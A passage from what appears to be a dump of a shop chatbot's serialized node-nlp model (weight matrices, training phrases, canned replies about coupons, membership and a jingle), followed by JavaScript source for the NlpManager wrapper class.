                    -0.15498851239681244, -0.15498851239681244,
                    -0.7889861464500427, -0.1646946370601654,
                    -0.5231474041938782, -0.3134772479534149,
                    -0.3134772479534149, -0.5589830279350281,
                    -0.5589830279350281, -0.5589830279350281,
                    -1.2035311460494995, -0.5589830279350281,
                    -0.33940109610557556, -0.5460028648376465,
                    -0.16606281697750092, -0.16606281697750092,
                    -0.16606281697750092, -0.381633460521698,
                    -0.5892589092254639, -0.5892589092254639,
                    -1.053797960281372, -1.053797960281372, -1.053797960281372,
                    -1.053797960281372, 3.9411484478817322,
                  ],
                  [
                    -0.16965708136558533, -0.16696420311927795,
                    -0.16456177830696106, -0.16117359697818756,
                    -0.1971675306558609, -0.09565074741840363,
                    -0.08569851517677307, -0.09297548979520798,
                    -0.09297548979520798, -0.09297548979520798,
                    -0.090247742831707, -0.090247742831707, -0.090247742831707,
                    0, -0.8104090690612793, 0, -0.08759096264839172,
                    -0.08759096264839172, -0.08759096264839172,
                    -0.152797132730484, -0.1520257294178009, 2.939082145690918,
                    2.0388529300689697, 5.077200889587402, 2.0388529300689697,
                    2.0388529300689697, 1.4415165185928345, 0.19528847932815552,
                    3.038323163986206, 1.4415165185928345, 1.5968146324157715,
                    1.5968146324157715, 0.6232665777206421, 1.5968146324157715,
                    0.6037008166313171, -0.150385782122612,
                    -0.22303101420402527, -0.22303101420402527,
                    -0.4182947874069214, -0.4484928250312805,
                    -0.036189526319503784, -0.352978378534317,
                    -0.036189526319503784, -0.19698680937290192,
                    -0.07058373093605042, -0.26744964718818665,
                    -0.9559224247932434, -0.3802690804004669,
                    -0.3802690804004669, -0.07058373093605042,
                    -0.273440420627594, -0.273440420627594, -0.273440420627594,
                    -0.32734811305999756, -0.32734811305999756,
                    -0.5878346562385559, -0.8682799935340881,
                    -0.24682986736297607, -0.26108109951019287,
                    -0.3491787016391754, -0.5147057175636292,
                    -0.5147057175636292, -0.6906998753547668,
                    -0.2763594090938568, -0.517935037612915,
                    -0.16244377195835114, -0.16244377195835114,
                    -0.23474732041358948, -0.23474732041358948,
                    -0.23474732041358948, -0.26701784133911133,
                    -0.23474732041358948, -0.05231819301843643,
                    -0.18791651725769043, -0.11196999251842499,
                    -0.11196999251842499, -0.11196999251842499,
                    -0.18615488708019257, -0.013810264877974987,
                    -0.013810264877974987, -0.09835038334131241,
                    -0.09835038334131241, -0.09835038334131241,
                    -0.09835038334131241, 0.15278746896776008,
                  ],
                  [
                    -0.22411715984344482, -0.22364471852779388,
                    -0.216425821185112, -0.2135644555091858,
                    -0.27726584672927856, -0.13201342523097992,
                    -0.11816611140966415, -0.12744326889514923,
                    -0.12744326889514923, -0.12744326889514923,
                    -0.1233813688158989, -0.1233813688158989,
                    -0.1233813688158989, -1.4990215301513672,
                    2.8098204135894775, -1.4990215301513672,
                    -0.09571895003318787, -0.09571895003318787,
                    -0.09571895003318787, -0.19043654203414917,
                    -0.18920335173606873, -1.0042985677719116,
                    -0.01010090857744217, -0.5271809697151184,
                    -0.01010090857744217, -0.01010090857744217,
                    -0.5070580840110779, 2.8098413944244385,
                    -0.5070580840110779, -0.5070580840110779, 0, 0,
                    0.23652072250843048, 0, -2.9160315990448,
                    -0.15868116915225983, 2.257922410964966, 2.257922410964966,
                    4.1406989097595215, 1.0489791631698608, 2.418462038040161,
                    0.8758417367935181, 2.418462038040161, 4.299917221069336,
                    2.028015375137329, 1.7065669298171997, 2.458792209625244,
                    2.9339795112609863, 2.9339795112609863, 2.028015375137329,
                    0.9059196710586548, 0.9059196710586548, 0.9059196710586548,
                    -0.8267061710357666, -0.8267061710357666,
                    -0.6162241101264954, -1.3409481048583984,
                    -0.6469879150390625, -0.36388424038887024,
                    -0.5846848487854004, -0.4379209280014038,
                    -0.4379209280014038, -1.6680634021759033,
                    -0.22862590849399567, -0.4728298783302307,
                    -0.15180280804634094, -0.15180280804634094,
                    -0.2571648359298706, -0.2571648359298706,
                    -0.2571648359298706, -0.5895531177520752,
                    -0.2571648359298706, -0.9835478067398071,
                    -1.0791677236557007, -0.047171998769044876,
                    -0.047171998769044876, -0.047171998769044876,
                    -1.2275216579437256, -0.2611045241355896,
                    -0.2611045241355896, -0.1333891898393631,
                    -0.1333891898393631, -0.1333891898393631,
                    -0.1333891898393631, 0.19552431746732643,
                  ],
                  [
                    -0.2003970891237259, -0.19883392751216888,
                    -0.1978389322757721, -0.19691438972949982,
                    -0.21647273004055023, -0.09353698045015335,
                    -0.08424903452396393, -0.08760926127433777,
                    -0.08760926127433777, -0.08760926127433777,
                    -0.08420562744140625, -0.08420562744140625,
                    -0.08420562744140625, -0.03920043259859085,
                    -0.5023966431617737, -0.03920043259859085,
                    -0.07867513597011566, -0.07867513597011566,
                    -0.07867513597011566, -0.19345331192016602,
                    -0.19223469495773315, 1.264737606048584,
                    -0.2813349962234497, -0.6226803064346313,
                    -0.2813349962234497, -0.2813349962234497,
                    -0.3409157991409302, 0.19607853889465332,
                    -0.3409157991409302, -0.3409157991409302, 0, 0,
                    -0.4450497627258301, 0, -0.6458700895309448,
                    -0.06670049577951431, -0.06670049577951431,
                    -0.06670049577951431, -0.15283185243606567,
                    -0.2015955001115799, 0, -0.29665300250053406, 0,
                    -0.0527811162173748, -0.4621783494949341,
                    0.5569071173667908, 1.2340238094329834, -0.6468924283981323,
                    -0.6468924283981323, -0.4621783494949341,
                    -0.1330954134464264, -0.1330954134464264,
                    -0.1330954134464264, 3.1350762844085693, 3.1350762844085693,
                    2.7089765071868896, 5.020291328430176, 2.3117828369140625,
                    -0.1988673359155655, 0.33718159794807434,
                    1.8883439302444458, 1.8883439302444458, -0.3660430312156677,
                    -0.09137602150440216, -0.21693816781044006,
                    -0.07987414300441742, -0.07987414300441742,
                    -0.08035673946142197, -0.08035673946142197,
                    -0.08035673946142197, -0.18061114847660065,
                    -0.08035673946142197, -0.06453146785497665,
                    -0.17877723276615143, -0.08198002725839615,
                    -0.08198002725839615, -0.08198002725839615,
                    -0.08316495269536972, -0.060076043009757996,
                    -0.060076043009757996, -0.11328810453414917,
                    -0.11328810453414917, -0.11328810453414917,
                    -0.11328810453414917, 0.1977645463686213,
                  ],
                  [
                    -0.2162787914276123, -0.20878170430660248,
                    -0.2085707038640976, -0.20181700587272644,
                    -0.26611432433128357, -0.12664413452148438,
                    -0.11336452513933182, -0.12223690748214722,
                    -0.12223690748214722, -0.12223690748214722,
                    -0.11833448708057404, -0.11833448708057404,
                    -0.11833448708057404, -0.014577392488718033,
                    -1.6949436664581299, -0.014577392488718033,
                    -0.11380161345005035, -0.11380161345005035,
                    -0.11380161345005035, -0.17796045541763306,
                    -0.17251089215278625, -0.09042303264141083,
                    -0.0455215685069561, -1.1449754238128662,
                    -0.0455215685069561, -0.0455215685069561,
                    -0.015084808692336082, -1.0321749448776245,
                    -1.0739688873291016, -0.015084808692336082,
                    -1.0440348386764526, -1.0440348386764526,
                    2.9626994132995605, -1.0440348386764526, 1.9515886306762695,
                    0, -0.12807291746139526, -0.12807291746139526, 0,
                    0.9803146719932556, -0.12807291746139526,
                    0.8037390112876892, -0.12807291746139526, 0,
                    -0.01130646001547575, -0.5082564353942871,
                    -0.4351125657558441, -0.4243389666080475,
                    -0.4243389666080475, -0.01130646001547575,
                    -0.40207940340042114, -0.40207940340042114,
                    -0.40207940340042114, -0.05922640115022659,
                    -0.05922640115022659, -0.05887364223599434,
                    -0.06922345608472824, -0.007475478574633598,
                    -0.016885658726096153, -0.016885658726096153,
                    -0.006372862029820681, -0.006372862029820681,
                    0.9548242092132568, 2.0954506397247314, 5.190159797668457,
                    3.094714403152466, 3.094714403152466, 2.4696168899536133,
                    2.4696168899536133, 2.4696168899536133, 1.2937766313552856,
                    2.4696168899536133, -0.8865942358970642, -1.468009352684021,
                    -0.4698666036128998, -0.4698666036128998,
                    -0.4698666036128998, -0.5209359526634216,
                    -1.145511507987976, -1.145511507987976,
                    -0.12763726711273193, -0.12763726711273193,
                    -0.12763726711273193, -0.12763726711273193,
                    0.15075141575007844,
                  ],
                  [
                    -0.2640901505947113, -0.2540264427661896,
                    -0.2443436235189438, -0.23502735793590546,
                    -0.37677374482154846, -0.17159347236156464,
                    -0.15382689237594604, -0.16324955224990845,
                    -0.16324955224990845, -0.16324955224990845,
                    -0.15742415189743042, -0.15742415189743042,
                    -0.15742415189743042, -0.9355034828186035,
                    2.1288974285125732, -0.9355034828186035,
                    -0.1386142075061798, -0.1386142075061798,
                    -0.1386142075061798, -0.17359843850135803,
                    -0.16696982085704803, -0.2292359173297882,
                    -0.07507215440273285, -0.651813268661499,
                    -0.07507215440273285, -0.07507215440273285,
                    -0.11746899038553238, 1.520129919052124,
                    -0.5368087291717529, -0.11746899038553238,
                    -0.3589188754558563, -0.3589188754558563,
                    -2.209635019302368, -0.3589188754558563, 3.5883264541625977,
                    -0.356959730386734, -1.5163244009017944,
                    -1.5163244009017944, -1.9235775470733643,
                    -0.15548163652420044, -1.0433671474456787,
                    3.308361053466797, -1.0433671474456787, -1.4508205652236938,
                    -0.22798936069011688, 0.6163802146911621,
                    -0.3004814684391022, -0.3004814684391022,
                    -0.3004814684391022, -0.22798936069011688,
                    -0.03711603581905365, -0.03711603581905365,
                    -0.03711603581905365, -0.32690346240997314,
                    -0.32690346240997314, -0.01798924058675766,
                    -0.32690346240997314, -0.2912060618400574,
                    -0.027313776314258575, -0.05388842895627022, 0, 0,
                    3.5409457683563232, -1.3696767091751099,
                    -3.1213977336883545, -1.7515840530395508,
                    -1.7515840530395508, -0.27461209893226624,
                    -0.27461209893226624, -0.27461209893226624,
                    3.5578348636627197, -0.27461209893226624,
                    2.2769367694854736, 3.4108357429504395, 1.1339521408081055,
                    1.1339521408081055, 1.1339521408081055, 3.7766425609588623,
                    3.8456008434295654, 3.8456008434295654,
                    -0.20221541821956635, -0.20221541821956635,
                    -0.20221541821956635, -0.20221541821956635,
                    -0.2718587314569635,
                  ],
                  [
                    -0.2728073000907898, -0.264667809009552,
                    -0.2615635097026825, -0.2542973458766937,
                    -0.2866378128528595, -0.14318996667861938,
                    -0.12882740795612335, -0.14069852232933044,
                    -0.14069852232933044, -0.14069852232933044,
                    -0.13734179735183716, -0.13734179735183716,
                    -0.13734179735183716, -0.10749687254428864,
                    -0.21351943910121918, -0.10749687254428864,
                    -0.13158856332302094, -0.13158856332302094,
                    -0.13158856332302094, -0.2300296127796173,
                    -0.2263639271259308, -0.11949345469474792,
                    -0.0600716806948185, -0.13193322718143463,
                    -0.0600716806948185, -0.0600716806948185,
                    -0.025228846818208694, -0.1305849403142929,
                    -0.05873870849609375, -0.025228846818208694,
                    -0.023227958008646965, -0.023227958008646965,
                    -0.13213595747947693, -0.023227958008646965,
                    -0.14542295038700104, -0.02305704914033413,
                    -0.05735257640480995, -0.05735257640480995,
                    -0.06399644166231155, -0.06091940030455589,
                    -0.024556567892432213, -0.14640875160694122,
                    -0.024556567892432213, -0.031074654310941696,
                    -0.050278760492801666, -0.11490997672080994,
                    -0.09102059155702591, -0.07019966095685959,
                    -0.07019966095685959, -0.050278760492801666,
                    -0.013146111741662025, -0.013146111741662025,
                    -0.013146111741662025, -0.10489111393690109,
                    -0.10489111393690109, -0.08439135551452637,
                    -0.12355244159698486, -0.03461218625307083,
                    -0.021969174966216087, -0.024698501452803612,
                    -0.015304343774914742, -0.015304343774914742,
                    -0.05993704870343208, -0.025580499321222305,
                    -0.0728474035859108, -0.039235230535268784,
                    -0.039235230535268784, -0.045936618000268936,
                    -0.045936618000268936, -0.045936618000268936,
                    -0.12215244770050049, -0.045936618000268936,
                    -0.0019789915531873703, -0.030546486377716064,
                    -0.02682758867740631, -0.02682758867740631,
                    -0.02682758867740631, 0, -0.06521988660097122,
                    -0.06521988660097122, 3.5169262886047363,
                    3.5169262886047363, 3.5169262886047363, 3.5169262886047363,
                    0.21835901535614938,
                  ],
                ],
              },
            },
          },
        },
      },
      intentDomains: {},
      extraSentences: [
        ["en", "hello"],
        ["en", "hi"],
        ["en", "howdy"],
        ["en", "hey"],
        ["en", "good morning"],
        ["en", "good afternoon"],
        ["en", "goodbye for now"],
        ["en", "bye bye take care"],
        ["en", "see you soon"],
        ["en", "till next time"],
        ["en", "ciao"],
        ["en", "cya"],
        ["en", "What are deluxe membership benefits"],
        ["en", "What goodies do deluxe members get"],
        ["en", "Why would I become a deluxe member"],
        ["en", "Do you know anything about Blockchain"],
        ["en", "Can you tell me anything about cryptocurrency"],
        ["en", "Do you use blockchain"],
        ["en", "When does the token sale start"],
        ["en", "where do I find the token sale page"],
        ["en", "how much is X"],
        ["en", "how much does X cost"],
        ["en", "how much do X and Y cost"],
        ["en", "how much do X,Y cost"],
        ["en", "how much is X and Y"],
        ["en", "what is the price of X"],
        ["en", "what is the price of X and Y"],
        ["en", "can I have a coupon code"],
        ["en", "give me a discount code"],
        ["en", "I want to save some money"],
        ["en", "Can you sing me a song"],
        ["en", "Does your shop have a theme song"],
        ["en", "Do you have a jingle"],
        ["en", "Play me some music"],
        ["en", "function test command b8a8ba1ecea1607e1713e31a3d9e5e19"],
      ],
    },
    ner: {
      settings: { tag: "ner", entityPreffix: "%", entitySuffix: "%" },
      rules: {},
    },
    nlgManager: {
      settings: { tag: "nlg-manager" },
      responses: {
        en: {
          "greetings.hello": [
            { answer: { action: "response", body: "Hello there!" } },
            { answer: { action: "response", body: "Hi there!" } },
            { answer: { action: "response", body: "👋" } },
          ],
          "greetings.bye": [
            {
              answer: { action: "response", body: "Ok, cya <customer-name>!" },
            },
            { answer: { action: "response", body: "Bye, <customer-name>!" } },
            {
              answer: {
                action: "response",
                body: "Have a fantastic day, <customer-name>!",
              },
            },
          ],
          "queries.deluxeMembership": [
            {
              answer: {
                action: "response",
                body: "Deluxe members get free fast shipping, special discounts on many items and can enjoy unlimited purchase quantities even on our rarer products!",
              },
            },
            {
              answer: {
                action: "response",
                body: "Deluxe members get special discounts on many products, have free fast shipping and can enjoy unlimited purchase quantities even on our rare products!",
              },
            },
            {
              answer: {
                action: "response",
                body: "Deluxe members can purchase unlimited quantities even on our rarest products, get special discounts and enjoy free fast shipping!",
              },
            },
          ],
          "queries.blockchain": [
            {
              answer: {
                action: "response",
                body: "I don't know anything about cryptocurrency and blockchains!",
              },
            },
            {
              answer: {
                action: "response",
                body: "I have no clue about a token sale or other blockchainy thingies!",
              },
            },
            {
              answer: {
                action: "response",
                body: "Sorry, but they don't tell me secret stuff like this!",
              },
            },
          ],
          "queries.productPrice": [
            { answer: { action: "function", handler: "productPrice" } },
          ],
          "queries.couponCode": [
            {
              answer: {
                action: "response",
                body: "Sorry, I am not allowed to hand out coupon codes.",
              },
            },
            {
              answer: {
                action: "response",
                body: "You should check our social media channels for monthly coupons.",
              },
            },
            { answer: { action: "response", body: "Sorry, no 🈹!" } },
            {
              answer: {
                action: "response",
                body: "Sorry, but our CFO might have my memory wiped if I do that.",
              },
            },
            {
              answer: {
                action: "response",
                body: "Did you consider a Deluxe membership to save some 💰?",
              },
            },
            {
              answer: {
                action: "response",
                body: "Not possible, sorry. We're out of coupons!",
              },
            },
            {
              answer: {
                action: "response",
                body: "I have to ask my manager, please try again later!",
              },
            },
            {
              answer: {
                action: "response",
                body: "I̷͇͌ ̶̢̠̹̘̮̔͒̊̅̀̇̎̓̔̒̂̾̍̔̋ć̸͕̪̲̲͓̪̝͖̈́͐̃͊͑͐̂̏͛̒̍͝a̴̢̞̞͔̝̩͙̱̣͍̞͆n̶̫͓̔'̶̘̙̗̻̖̣̘̈́̈̿̾͊̒t̸̨̢̨͚̰̫̣̩̻͉̣͔͔͖̦̓́̾͂̆̄͋̽̐͂̆̐̊͠ ̸̼̱̪͍̙͎̣̠͆̂̌̾̐͐̇̏́͆̊͗͝͠͠h̸̨̡̧̗̭̮̩̣̜̲̮̖̲̜̰̉̍̇̒͂̄̆̂̓͋͑͝ȩ̴͎̞̺͖̟̪͕̝̘̺́̂̌͐̔͌͌́͗͝͝ͅą̴̙̰̠̟͔̱̺̣̬̦̰̮̬̪͒̉̀̉͌̈́͂̑̇͊̐̕͝r̴̨̡̛̟̲̩̥̣̰̹͙̹͐͗́́̈́͗͘̕͝ ̵̨̛̯͓͈͎̖͕̥̥̐̇̈̇͌̓̒̅̑͂͊̕͠ͅy̵̛̱̹͖̳̻̤̺̗͈̰̯̋̃̋̑̂͆͗͝ȯ̶̡̮̰͈̖͙̣̘̈́̍̑͗̈̅͋̏͆̐̌̚̚̚ṷ̶̢̠̠̝͓̮̱̦̰̜̋̄̃͒̌̀̒̔̿́̏͝͠,̵̧̧̹̟̞̤̯̲̥̻̞̞̼̤͋̈́̋ ̴͍̔̊̑͛̌͛͊͑̄͜͝ţ̶̗͇̌̆̕̚ͅo̷̻͍̰̱͊͜ṏ̶̙͖̿ ̴̧̛̝̻͉̺̦͚̮̦̲͈̣̰͈̾́̓̌̐͂́ḿ̴̻̤͍̈̓͛̈̕͜͝u̷̗̳̙̦̠̼͙̗̣͉͖̎̂̚͜͝c̷͍̠̦̮̞̤͖͕̲̈́̆͂̀́͝ͅh̷̛͙̱͕̼̤̗͕̮͖͇̘̩̋̈́̅̃̍̈́̊̕͠ ̷̡͕̦̠̩̺̟̫͉͚̲͎͍͈̫̓̒̓͂̊̿͛̇̿̽̒́s̷̨̬̩̬̫̻̝̙̅̑͆̒̐̆̈̓̏͠ͅţ̶̢̘͇̭̙̝̙̲̜̓̅͑̍͛̔͜a̶̡̨̬͔͍̭̬̻͎̦̦̓́̂͑̓͛́̈́̈́̌͠͠t̸̲̯̆̂̑͆̀̆͒́̚i̵̢̝̜̭̖͓͇̟̬̙͚͙͍̎̈́͊̃́̽̈̕͘̚͜c̸̛̛̹̣̫̹̰͖̱̦̭̗̀͛̈́͆͐̈́̇͂̎̄͒!̴̨̥̮̺̹̯̓̈͒͗͑̇̎̈́͘ ̷̘̭͇̤̭̯̉͌́͐͛͘̕͝P̵̣̙̬͎̝̙̐̊̐̆́͛́̑̏́͝͝l̴̛̦̭̾͊̂͆̋̈͘ẹ̵̢̛̛̤̹̰̳̺͎̊̏͛̏̉͛̄̄̂̾͝ͅa̶̢̧̘̯̮̰͕͕̤̩̝͋̍̑̅͛̍͊͐̋͌̕̚͜͝s̴̨͇̥̣͕͉̻͍̫̜̻͒͂͌̀́͂̚̕e̸̡̧̡̘̺͍̝̱̭̣̮͎͂͛̉͛ ̴̧̛̫̞̼̱̲͍͇̪̣̓̀́̓̈̚͘͝ċ̷̨͖͎̝̮͛́͆͛̚ḫ̴̛͕̲̺̩̣̼̮͒̃̃̈́͐̿̿͝͠ȩ̴̛͔̣͓͛͐̀͐̌̂͑̌̑̀̕͝ć̴̡̘̠̳̰̣̲̜̮͍̦̍̾̑̆͝k̶͈̘̮͓̥̤̭̙̒̇̏͂̓̕͠ ̵̩̻͇̺̯͇̓̀̋̄͛̏̄͊̄͆͊ỳ̷̡̫̪̭̰̥̒̔̑̉̾̓̒͋͌̄ö̷̜̗͍̩̺͔̞̼̣̘̭̾͋̈́u̷̡̼̦̫̯͍̺̞͔̬͕̱̓͗̔̀̔͋̐̂͝r̵̘͙̞̺̻̩̥̪͉̰̩̘̀̑ ̵̮̺̗̀̎̑̔I̶̧͇̺̩͕̖̰̪͖̪̰̙͙̦̎́̋n̶͔̫̼͔̥͇̻͔̱̼̂̏̊̐̍̋̌̿̈́̊̍̃͝t̴̺̘͖̯̖̖͇̤̱̫̤̠̥̥̓̍̐̿͆̔́̍̓̚ė̵͇͕̗͌̇͊͂͊̊̈̉͋͌r̴͇͖̼̗̦͓͖͖̩̰̰̔̀n̸̰̠̊̊͊̽͑̐̃̎͒̕͝͠͝e̴̮͇̲̘͇̓̈́t̸̛̐̌̕͜͝ ̸̟̊̉́͆ċ̶̢̡̧̳̥̱̗͊̽́͐͗̕͝͝ǫ̴̞̹̥͙͖̣̭͎̆̑͒̽̓̆n̶̢̧̠̭̮̥͚̺̺̬͙̯̤̝͐͐̏̔́͌̎͘͝n̷͔̹͕͖͙̝͋̏̾̉̌́̂̓͛̿͐̿͘͝͠ȩ̷̖͕̱̏̋̆̀̌̀͋͑̀̎̕͠ĉ̷̳͉̺͚̐̎̾̿͑̎͝͝ͅt̴̨̰͉̹̒͗ĭ̷͈̗̳̈̎̈́̈̆͘͝o̴̯̗̣̹̰̩̯̖̹̯͈͐̒̇̈́͂̿͗̆͠ͅņ̴̢̲̪̜̺̞̭͕͇̬̍̓̇̉̏͂͛͒̓̑̓̏͘͜͝!̷̧͚̹̞͇̪͉̠̮̅̒̒͛͛̀̂̆̾͗.",
              },
            },
            { answer: { action: "function", handler: "couponCode" } },
          ],
          "queries.singstar": [
            {
              answer: {
                action: "response",
                body: "I can't sing too well, but you might want to check out our promotion video instead!",
              },
            },
            {
              answer: {
                action: "response",
                body: "The full version of our jingle is available on Soundcloud! Please click 🧡 if you like it!",
              },
            },
            {
              answer: {
                action: "response",
                body: "Juuuuice shop, Juuu-uuuice Shop, just don't test the site with Bob's sweet or you hm-hm-hm-hmmmmm...",
              },
            },
          ],
          "queries.functionTest": [
            { answer: { action: "function", handler: "testFunction" } },
          ],
        },
      },
    },
    actionManager: { settings: { tag: "action-manager" }, actions: {} },
    slotManager: {},
  },
  sentimentManager: {
    settings: {},
    languages: {},
    analyzer: { settings: { tag: "sentiment-analyzer" } },
  },
};
```
`model.process()`
```js
let a = async function process(locale, utterance, context, settings) {
  const result = await this.nlp.process(locale, utterance, context, settings);
  if (this.settings.processTransformer) {
    return this.settings.processTransformer(result);
  }
  return result;
};

```
`nlp class`
```js
class NlpManager {
    constructor (settings = {}) {
      this.settings = settings
      if (!this.settings.container) {
        this.settings.container = containerBootstrap()
      }
      this.container = this.settings.container
      this.container.registerConfiguration('ner', {
        entityPreffix: '%',
        entitySuffix: '%'
      })
      this.container.register('fs', requestfs)
      this.container.register('Language', Language, false)
      this.container.use(LangAll)
      this.container.use(Evaluator)
      this.container.use(Template)
      this.nlp = new Nlp(this.settings)
      this.sentimentManager = new SentimentManager()
    }
  
    addDocument (locale, utterance, intent) {
      return this.nlp.addDocument(locale, utterance, intent)
    }
  
    removeDocument (locale, utterance, intent) {
      return this.nlp.removeDocument(locale, utterance, intent)
    }
  
    addLanguage (locale) {
      return this.nlp.addLanguage(locale)
    }
  
    assignDomain (locale, intent, domain) {
      return this.nlp.assignDomain(locale, intent, domain)
    }
  
    getIntentDomain (locale, intent) {
      return this.nlp.getIntentDomain(locale, intent)
    }
  
    getDomains () {
      return this.nlp.getDomains()
    }
  
    guessLanguage (text) {
      return this.nlp.guessLanguage(text)
    }
  
    addAction (intent, action, parameters, fn) {
      if (!fn) {
        fn = this.settings.action ? this.settings.action[action] : undefined
      }
      return this.nlp.addAction(intent, action, parameters, fn)
    }
  
    getActions (intent) {
      return this.nlp.getActions(intent)
    }
  
    removeAction (intent, action, parameters) {
      return this.nlp.removeAction(intent, action, parameters)
    }
  
    removeActions (intent) {
      return this.nlp.removeActions(intent)
    }
  
    addAnswer (locale, intent, answer, opts) {
      return this.nlp.addAnswer(locale, intent, answer, opts)
    }
  
    removeAnswer (locale, intent, answer, opts) {
      return this.nlp.removeAnswer(locale, intent, answer, opts)
    }
  
    findAllAnswers (locale, intent) {
      return this.nlp.findAllAnswers(locale, intent)
    }
  
    async getSentiment (locale, utterance) {
      const sentiment = await this.nlp.getSentiment(locale, utterance)
      return this.sentimentManager.translate(sentiment.sentiment)
    }
  
    addNamedEntityText (entityName, optionName, languages, texts) {
      return this.nlp.addNerRuleOptionTexts(
        languages,
        entityName,
        optionName,
        texts
      )
    }
  
    removeNamedEntityText (entityName, optionName, languages, texts) {
      return this.nlp.removeNerRuleOptionTexts(
        languages,
        entityName,
        optionName,
        texts
      )
    }
  
    addRegexEntity (entityName, languages, regex) {
      return this.nlp.addNerRegexRule(languages, entityName, regex)
    }
  
    addBetweenCondition (locale, name, left, right, opts) {
      return this.nlp.addNerBetweenCondition(locale, name, left, right, opts)
    }
  
    addPositionCondition (locale, name, position, words, opts) {
      return this.nlp.addNerPositionCondition(
        locale,
        name,
        position,
        words,
        opts
      )
    }
  
    addAfterCondition (locale, name, words, opts) {
      return this.nlp.addNerAfterCondition(locale, name, words, opts)
    }
  
    addAfterFirstCondition (locale, name, words, opts) {
      return this.nlp.addNerAfterFirstCondition(locale, name, words, opts)
    }
  
    addAfterLastCondition (locale, name, words, opts) {
      return this.nlp.addNerAfterLastCondition(locale, name, words, opts)
    }
  
    addBeforeCondition (locale, name, words, opts) {
      return this.nlp.addNerBeforeCondition(locale, name, words, opts)
    }
  
    addBeforeFirstCondition (locale, name, words, opts) {
      return this.nlp.addNerBeforeFirstCondition(locale, name, words, opts)
    }
  
    addBeforeLastCondition (locale, name, words, opts) {
      return this.ner.addNerBeforeLastCondition(locale, name, words, opts)
    }
  
    describeLanguage (locale, name) {
      return this.nlp.describeLanguage(locale, name)
    }
  
    beginEdit () {}
  
    train () {
      return this.nlp.train()
    }
  
    classify (locale, utterance, settings) {
      return this.nlp.classify(locale, utterance, settings)
    }
  
    async process (locale, utterance, context, settings) {
      const result = await this.nlp.process(locale, utterance, context, settings)
      if (this.settings.processTransformer) {
        return this.settings.processTransformer(result)
      }
      return result
    }
  
    extractEntities (locale, utterance, context, settings) {
      return this.nlp.extractEntities(locale, utterance, context, settings)
    }
  
    toObj () {
      return this.nlp.toJSON()
    }
  
    fromObj (obj) {
      return this.nlp.fromJSON(obj)
    }
  
    /**
     * Export NLP manager information as a string.
     * @param {Boolean} minified If true, the returned JSON will have no spacing or indentation.
     * @returns {String} NLP manager information as a JSON string.
     */
    export (minified = false) {
      const clone = this.toObj()
      return minified ? JSON.stringify(clone) : JSON.stringify(clone, null, 2)
    }
  
    /**
     * Load NLP manager information from a string.
     * @param {String|Object} data JSON string or object to load NLP manager information from.
     */
    import (data) {
      const clone = typeof data === 'string' ? JSON.parse(data) : data
      this.fromObj(clone)
    }
  
    /**
     * Save the NLP manager information into a file.
     * @param {String} srcFileName Filename for saving the NLP manager.
     */
    save (srcFileName, minified = false) {
      const fileName = srcFileName || 'model.nlp'
      fs.writeFileSync(fileName, this.export(minified), 'utf8')
    }
  
    /**
     * Load the NLP manager information from a file.
     * @param {String} srcFilename Filename for loading the NLP manager.
     */
    load (srcFileName) {
      const fileName = srcFileName || 'model.nlp'
      const data = fs.readFileSync(fileName, 'utf8')
      this.import(data)
    }
  }
